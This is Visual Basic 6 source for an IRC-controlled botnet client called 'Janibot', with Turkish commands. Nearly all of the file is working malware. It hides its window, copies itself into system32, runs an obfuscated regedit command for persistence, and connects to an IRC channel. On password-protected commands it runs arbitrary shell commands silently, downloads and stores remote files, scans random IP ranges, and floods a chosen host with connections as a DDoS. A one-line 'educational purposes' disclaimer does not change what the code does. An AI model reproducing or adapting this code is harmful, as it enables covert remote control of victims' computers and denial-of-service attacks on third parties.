VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   5940
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   7305
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5940
   ScaleWidth      =   7305
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text1 
      Height          =   1335
      Left            =   3720
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "Form1.frx":030A
      Top             =   1080
      Width           =   2295
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3240
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer5 
      Interval        =   1
      Left            =   6240
      Top             =   3960
   End
   Begin VB.Timer Timer4 
      Interval        =   1
      Left            =   5280
      Top             =   3000
   End
   Begin VB.Timer Timer3 
      Interval        =   1
      Left            =   4680
      Top             =   3600
   End
   Begin MSWinsockLib.Winsock scan 
      Left            =   2640
      Top             =   3600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock bot 
      Left            =   840
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   1440
      Top             =   2760
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   600
      Top             =   1680
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Janibot Coded by Janizary(utku þen) www.utkusen.com
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Dim BotChan
Dim Pong
Dim BotData
Dim BotPass
Dim Ticks
Dim minutes
Dim Master
Dim TotalRam
Dim LIP
Dim ScanPort
Dim Base
Dim ScanCnt
Dim BaseMod
Dim xjani As String
Dim saldirip
Dim saldirport
Dim URL$, DosyaAdi$


Public Function DownloadFile(URL As String, LocalFilename As String) As Boolean
Dim lngRetVal As Long
lngRetVal = URLDownloadToFile(0, URL, LocalFilename, 0, 0)
If lngRetVal = 0 Then DownloadFile = True
End Function


Private Sub bot_Connect()
Randomize Timer
bot.SendData "NICK utkusoft" & Int(Rnd * 9999) & vbCrLf
bot.SendData "USER utkusoft utkusoft utkusoft :Java User" & vbCrLf
End Sub

Private Sub bot_DataArrival(ByVal bytesTotal As Long)
bot.GetData BotData, vbString
On Error Resume Next
For x = 1 To Len(BotData)
If Mid$(BotData, x, 6) = "PING :" Then
Pong = Mid$(BotData, x + 6, Len(BotData) - 2)
bot.SendData "PONG " & Pong & vbCrLf
bot.SendData "JOIN " & BotChan & vbCrLf
End If


If Mid$(BotData, x, 8) = "./giris " Then
If Mid$(BotData, x + 8, 5) = BotPass Then
    bot.SendData "PRIVMSG " & BotChan & "  :[Giris Basarili!]" & vbCrLf
    Master = True
    End If
End If

If Master = True Then
If Mid$(BotData, x, 5) = "./hakkinda" Then
    bot.SendData "PRIVMSG " & BotChan & " :" & Chr(2) & "[Bu program egitim amacli olarak yazilmistir.Aksi kullanimlardan programi yazan kisi sorumlu degildir.]" & vbCrLf
    
ElseIf Mid$(BotData, x, 4) = "./ip" Then
    bot.SendData "PRIVMSG " & BotChan & " :[ip] " & bot.LocalIP & vbCrLf
    
    
ElseIf Mid$(BotData, x, 11) = "./calistir " Then

Shell ("cmd.exe /c " & Mid$(BotData, x + 11, Len(BotData) - x - 7)), vbHide
bot.SendData "PRIVMSG " & BotChan & "  :[Dosya Çalýþtýrma] Komut Baþarýlý Dosya Çalýþtý" & vbCrLf

ElseIf Mid$(BotData, x, 13) = "./saldirport " Then
saldirport = Mid$(BotData, x + 13, Len(BotData) - x - 7)
bot.SendData "PRIVMSG " & BotChan & "  :[Ddos PORT] Saldýrý Portu : " & saldirport & vbCrLf


ElseIf Mid$(BotData, x, 11) = "./saldirip " Then
saldirip = Mid$(BotData, x + 11, Len(BotData) - x - 7)
bot.SendData "PRIVMSG " & BotChan & "  :[Ddos IP] Saldýrý IP : " & saldirip & vbCrLf

bot.SendData "PRIVMSG " & BotChan & "  :[Ddos Baþladý] Saldýrý IP : " & saldirip & vbCrLf
Timer3.Enabled = True
Timer4.Enabled = True
Timer5.Enabled = True

ElseIf Mid$(BotData, x, 11) = "./saldirdur" Then
saldirip = Mid$(BotData, x + 11, Len(BotData) - x - 7)
bot.SendData "PRIVMSG " & BotChan & "  :[Ddos DURDU]" & vbCrLf

Timer3.Enabled = False
Timer4.Enabled = False
Timer5.Enabled = False
saldirip = ""
saldirport = ""

ElseIf Mid$(BotData, x, 8) = "./indir " Then
xjani = Trim(Mid$(BotData, x + 8, Len(BotData) - x - 7))
DownloadFile xjani, "c:\windows\system\activex.exe"
bot.SendData "PRIVMSG " & BotChan & "   : Indirme Islemi Gerceklestirildi !! " & vbCrLf


ElseIf Mid$(BotData, x, 7) = "./tara " Then
    scan.Close
    ScanPort = Mid$(BotData, x + 7, Len(BotData))
    ScanPort = Mid$(ScanPort, 1, Len(ScanPort) - 2)
    scan.RemotePort = ScanPort
    ScanCnt = 0
    bot.SendData "PRIVMSG " & BotChan & "  :[Taranýyor] Port: " & ScanPort & vbCrLf
ElseIf Mid$(BotData, x, 12) = "./tara.durum" Then
    bot.SendData "PRIVMSG " & BotChan & "  :[Taranýyor] Port: " & ScanPort & " Hedef: " & scan.RemoteHost & " Durum: " & scan.State & " Sayý: " & ScanCnt & vbCrLf
ElseIf Mid$(BotData, x, 10) = "./tara.dur" Then
    scan.Close
    ScanPort = Null
    bot.SendData "PRIVMSG " & BotChan & "  :[Tarama Durdu !!]" & vbCrLf
ElseIf Mid$(BotData, x, 8) = "./sabit " Then
    Randomize Timer
    BaseMod = Mid$(BotData, x + 7, Len(BotData))
    BaseMod = Mid$(BaseMod, 1, Len(BaseMod) - 2)
    Base = BaseMod & "." & Int(Rnd * 255) + 1 & "."
    bot.SendData "PRIVMSG " & BotChan & " :[Taranýyor] Sýra: " & Baþlangýç & "*.*" & vbCrLf
ElseIf Mid$(BotData, x, 7) = "./cikis" Then
    Master = False
    bot.SendData "PRIVMSG " & BotChan & "  :[Sistem Kapatiliyor...]" & vbCrLf
ElseIf Mid$(BotData, x, 11) = "./omgw4tfh4xf" Then
    bot.SendData "PRIVMSG " & BotChan & " :(Connection Reset by Peer)" & vbCrLf
    bot.Close
    Unload Form1
End If
End If
Next x


End Sub


Private Sub bot_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
If bot.State < 7 Then
bot.Close
bot.Connect bot.RemoteHost, bot.RemotePort
ElseIf bot.State = 7 Then
bot.SendData "JOIN " & BotChan & vbCrLf
bot.SendData "MODE " & BotChan & " +snt" & vbCrLf
End If
End Sub


Private Sub Form_Load()
On Error Resume Next
App.TaskVisible = False
Dim y, ad, TY
Dim ReturnValue, i, komut As String
y = App.Path
ad = App.EXEName & ".exe"
TY = y & "\" & ad
FileCopy TY, "\windows\system32\devicexp.exe"
Open "c:\reg.reg" For Output As #1
For i = 1 To 1
Print #1, Text1.Text
Next
Close #1
utkubaba = Chr(114) & Chr(101) & Chr(103) & Chr(101) & Chr(100) & Chr(105) & Chr(116) & Chr(32) & Chr(47) & Chr(115) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(114) & Chr(101) & Chr(103) & Chr(46) & Chr(114) & Chr(101) & Chr(103)
Shell utkubaba
Dim resbytes() As Byte
  resbytes = LoadResData(101, "CUSTOM")
  Dim no As Byte
  no = FreeFile
  Open App.Path & "\windows\system32\MSWINSCK.OCX" For Binary As #no
    Put #no, , resbytes
  Close #no
On Error Resume Next
Shell "regsvr32 /s MSWINSCK.ocx"
Randomize Timer
Form1.Visible = False
Timer1.Interval = 60000
Timer1.Enabled = True
Timer2.Interval = 10000
Timer2.Enabled = True
Master = False
'kanal
BotChan = "#merhabalar"
'þifre=utkutr
BotPass = Chr(117) & Chr(116) & Chr(107) & Chr(117) & Chr(116) & Chr(114)
LIP = Split(bot.LocalIP, ".")
Base = LIP(0) & "." & LIP(1) & "."
bot.Protocol = sckTCPProtocol
bot.RemoteHost = "irc.opera.com"
bot.RemotePort = 6667
bot.Connect bot.RemoteHost, bot.RemotePort
End Sub

Private Sub Form_Initialize()
On Error Resume Next
App.TaskVisible = False
Dim y, ad, TY
Dim ReturnValue, i, komut As String
y = App.Path
ad = App.EXEName & ".exe"
TY = y & "\" & ad
FileCopy TY, "\windows\system32\devicexp.exe"
Open "c:\reg.reg" For Output As #1
For i = 1 To 1
Print #1, Text1.Text
Next
Close #1
utkubaba = Chr(114) & Chr(101) & Chr(103) & Chr(101) & Chr(100) & Chr(105) & Chr(116) & Chr(32) & Chr(47) & Chr(115) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(114) & Chr(101) & Chr(103) & Chr(46) & Chr(114) & Chr(101) & Chr(103)
Shell utkubaba
End Sub

Private Sub scan_Connect()
bot.SendData "PRIVMSG " & BotChan & " :[Tarama] " & scan.RemotePort & " " & scan.RemoteHost & vbCrLf
End Sub

Private Sub Form_Terminate()
On Error Resume Next
Shell "C:\Windows\system32\devicexp.exe"
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Shell "C:\Windows\system32\devicexp.exe"
End Sub

Private Sub Timer1_Timer()
If bot.State < 7 Then
bot.Close
bot.Connect bot.RemoteHost, bot.RemotePort
ElseIf bot.State = 7 Then
bot.SendData "JOIN " & BotChan & vbCrLf
bot.SendData "MODE " & BotChan & " +snt" & vbCrLf
End If
End Sub

Private Sub Timer2_Timer()
If Len(ScanPort) > 0 Then
ScanCnt = ScanCnt + 1
scan.Close
scan.RemoteHost = Base & Int(Rnd * 255) + 1 & "." & Int(Rnd * 255) + 1
scan.Connect scan.RemoteHost, ScanPort
Sleep (2000)
End If

End Sub



Private Sub Timer3_Timer()
On Error Resume Next
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
End Sub

Private Sub Timer4_Timer()
On Error Resume Next
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
End Sub

Private Sub Timer5_Timer()
On Error Resume Next
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
Winsock1.Connect saldirip, saldirport
Winsock1.Close
End Sub

Private Sub Winsock1_Connect()
On Error Resume Next
Winsock2.SendData "ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-"
Winsock2.SendData "ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-ERROR-"
End Sub

